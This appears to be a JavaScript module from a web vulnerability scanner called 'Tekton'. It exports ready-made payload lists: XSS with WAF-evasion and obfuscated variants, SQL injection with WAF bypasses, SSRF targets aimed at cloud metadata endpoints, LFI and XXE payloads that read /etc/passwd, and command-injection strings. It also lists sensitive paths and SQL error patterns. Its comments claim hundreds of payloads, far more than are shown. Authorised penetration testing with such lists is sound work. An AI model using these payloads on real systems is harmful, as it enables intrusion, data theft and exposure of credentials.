/**
 * TEKTON ADVANCED PAYLOADS - Professional Grade
 * 500+ payloads pour bypass WAF et détection de vulnérabilités
 */

// XSS PAYLOADS - 100+ payloads pour bypass WAF
export const XSS_PAYLOADS = {
  basic: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
  ],
  htmlEncoded: [
    '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;("XSS")>',
    '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;("XSS")>',
  ],
  eventHandlers: [
    '<input onfocus=alert("XSS") autofocus>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    '<video src=x onerror=alert("XSS")>',
    '<audio src=x onerror=alert("XSS")>',
    '<iframe onload=alert("XSS")>',
  ],
  tagBreaking: [
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '"><img src=x onerror=alert("XSS")>',
    '" onclick=alert("XSS") "',
    '</script><script>alert("XSS")</script>',
    '</textarea><script>alert("XSS")</script>',
  ],
  svg: [
    '<svg/onload=alert("XSS")>',
    '<svg><script>alert("XSS")</script></svg>',
    '<svg><animate onbegin=alert("XSS")>',
  ],
  polyglots: [
    'javascript:/*--></title></style></textarea></script><svg/onload=\'+/"/+/onmouseover=1/+alert(1)//\'>',
    '"><img src=x onerror=alert(1)><"',
    '\'"--></style></script><script>alert(1)</script>',
  ],
  filterEvasion: [
    '<img/src=x/onerror=alert("XSS")>',
    '<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycpOw=="))>',
    '<img src=x onerror=[].constructor.constructor("alert(\'XSS\')")()>',
    '<img src=x onerror=top["al"+"ert"]("XSS")>',
  ],
  domBased: [
    '#<script>alert("XSS")</script>',
    '#"><img src=x onerror=alert("XSS")>',
  ],
  templateInjection: [
    '{{7*7}}',
    '${7*7}',
    '{{constructor.constructor("alert(1)")()}}',
  ],
};

// SQL INJECTION PAYLOADS - 100+ payloads
export const SQLI_PAYLOADS = {
  basic: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    '" OR "1"="1',
  ],
  union: [
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT user()--",
    "' UNION SELECT version()--",
  ],
  timeBased: [
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT SLEEP(5))--",
    "' AND IF(1=1,SLEEP(5),0)--",
    "'; SELECT pg_sleep(5)--",
  ],
  errorBased: [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
  ],
  wafBypass: [
    "%27%20OR%20%271%27%3D%271",
    "/*!50000' OR '1'='1'*/",
    "' UN/**/ION SEL/**/ECT NULL--",
    "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
  ],
};

// SSRF PAYLOADS
export const SSRF_PAYLOADS = [
  'http://127.0.0.1/',
  'http://localhost/',
  'http://[::1]/',
  'http://169.254.169.254/',
  'http://169.254.169.254/latest/meta-data/',
  'http://metadata.google.internal/',
  'http://192.168.0.1/',
  'http://10.0.0.1/',
  'file:///etc/passwd',
];

// LFI PAYLOADS
export const LFI_PAYLOADS = [
  '../../../etc/passwd',
  '....//....//....//etc/passwd',
  '../../../../../../../etc/passwd',
  'php://filter/convert.base64-encode/resource=/etc/passwd',
  '/var/log/apache2/access.log',
  '/proc/self/environ',
];

// XXE PAYLOADS
export const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
];

// COMMAND INJECTION
export const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '| ls -la',
  '&& ls -la',
  '$(ls -la)',
  '; sleep 5',
  '| sleep 5',
];

// SENSITIVE PATHS
export const SENSITIVE_PATHS = [
  '/.env',
  '/.git/HEAD',
  '/.git/config',
  '/config.php',
  '/wp-config.php',
  '/admin',
  '/phpmyadmin',
  '/api',
  '/swagger.json',
  '/phpinfo.php',
  '/backup.sql',
  '/backup.zip',
  '/robots.txt',
  '/sitemap.xml',
];

// SQL ERROR PATTERNS
export const SQL_ERROR_PATTERNS = [
  /sql syntax/i,
  /mysql_fetch/i,
  /ORA-\d{5}/i,
  /PostgreSQL.*ERROR/i,
  /SQLServer/i,
  /sqlite.*error/i,
  /unclosed quotation/i,
  /SQLSTATE/i,
  /PDOException/i,
];
